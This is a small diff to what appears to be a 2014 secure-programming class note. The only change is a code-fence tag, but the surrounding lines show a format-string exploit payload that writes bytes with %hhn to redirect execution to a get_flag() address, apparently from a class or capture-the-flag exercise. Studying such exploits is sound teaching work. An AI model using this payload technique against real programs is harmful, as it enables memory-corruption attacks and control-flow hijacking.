@@ -6,7 +6,7 @@ slug: secure-programming-20141028
 ---
 2014/10/28 Secure Programming Class Note
 
-```
+```text
 \xdc\xed\xbf\xbf\xdd\xed\xbf\xbf\xde\xed\xbf\xbf\xdf\xed\xbf\xbf%100 c%30$hhn%220c%31$hhn%55c%32$hhn%66c%33$hhn
 get_flag(): 0x0804861d
 29      %29c
